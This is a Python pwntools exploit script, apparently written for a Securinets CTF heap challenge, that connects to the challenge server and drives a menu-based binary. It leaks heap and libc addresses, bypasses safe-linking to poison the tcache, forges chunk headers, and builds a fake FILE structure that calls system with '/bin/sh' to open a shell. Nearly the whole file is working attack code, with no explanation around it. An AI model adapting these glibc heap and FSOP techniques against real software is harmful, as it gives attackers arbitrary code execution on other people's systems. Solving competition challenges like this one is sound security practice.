from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './main'
HOST = 'mainpwn-14caf623.p1.securinets.tn'
PORT =  9091

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


def add(idx, name, effect, cost=0x2222, cooldown=0x1111, element=4):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'): ', str(idx).encode())
    r.sendafter(b'name: ', name) # 0x20
    r.sendafter(b'effect: ', effect) # 0x40
    r.sendlineafter(b'cost: ', str(cost).encode())
    r.sendlineafter(b'): ', str(cooldown).encode())
    r.sendlineafter(b'Choice: ', str(element).encode())

def edit(idx, name, effect, cost=0x2222, cooldown=0x1111, element=4):
    r.sendlineafter(b'Choice: ', b'2')
    r.sendlineafter(b'): ', str(idx).encode())
    r.sendlineafter(b'name: ', name)
    r.sendlineafter(b'effect: ', effect)
    r.sendlineafter(b'cost: ', str(cost).encode())
    r.sendlineafter(b'): ', str(cooldown).encode())
    r.sendlineafter(b'Choice: ', str(element).encode())

def view():
    r.sendlineafter(b'Choice: ', b'3')

def delete(idx):
    r.sendlineafter(b'Choice: ', b'4')
    r.sendlineafter(b'): ', str(idx).encode())

def fb(leng, data):
    r.sendlineafter(b'Choice: ', b'5')
    r.sendlineafter(b'back: ', str(leng).encode())
    r.sendlineafter(b'back: ', data)


r = start()
if args.D:
    debug(r, [])

# place fake chunk header
add(0, b'aaaa', b'b'*0x38+p64(0x000081))
delete(0)
view()
r.recvuntil(b'Name: ')
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
print(f'{leak = :#x}')
heap = leak << 12
print(f'{heap = :#x}')

for i in range(14):
    add(i+1, b'aaaa', b'bbbb', i, i)

for i in range(8):
    delete(i+1)

edit(8, p64(heap+0x2f0 ^ (heap >> 12)), b'a')

add(9, b'aaaa', b'b'*0x3)

# change header for leak
add(10, b'A'*0x18+p64(0x481), b'BBBB')
delete(1)
view()
r.recvuntil(b'Slot 1')
r.recvuntil(b'Name: ')
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
print(f'{leak = :#x}')
base = leak - 0x203b20
print(f'{base = :#x}')
gmf = base + 0x20a1a0
environ = base + 0x20ad58

stderr = base + 0x0000000002044e0
stderr_lock = base + 0x205700
system = base + 0x58750
vtable = base + 0x202228# wfile_overflow - 0x18

# change header to create fake header in tcache meta
edit(0, b'aaaa', b'b'*0x38+p64(0x000d1))
delete(10)
edit(10, p64(0x81^(heap>>12)), b'b')


delete(11)
delete(12)

edit(12, p64((heap+0xe0) ^ (heap >> 12)), b'a')

# place fake header
fb(0xc8, b'aaa')

#pause()

add(15, b'aaaa', b'b'*0x3)
add(16, b'A'*0x20, b'B'*0x40)

edit(0, b'aaaa', b'b'*0x38+p64(0x000f1))
delete(10)


fsop = b''
fsop += flat(0x0101010101010101, u64(b';/bin/sh')) # flags, readp
fsop += flat(0, 0) # reade, readb
fsop += flat(0, 1) # writeb, writep
fsop += flat(0, 0) # bufb, bufp
fsop += flat(0, 0) # bufe, saveb
fsop += flat(0, 0) # backb, savee
fsop += flat(0, 0) # markers, chain
fsop += flat(system, 0) # fileno|flags2, old_offset
fsop += flat(0, stderr_lock) # 0, lock
fsop += flat(0, 0) # offset, codecvt
fsop += flat(stderr, 0) # wide_data, freeres_list
fsop += flat(0, 0) # freeres_buf
fsop += flat(0xffffffff, 0) # freeres_buf
fsop += flat(0, vtable) # 0, vtable
fsop += flat(stderr+8)


edit(16, b'a'*8+p64(stderr), b'B'*0x40)
fb(0xe8, fsop)
r.sendline(6)


r.interactive()
r.close()

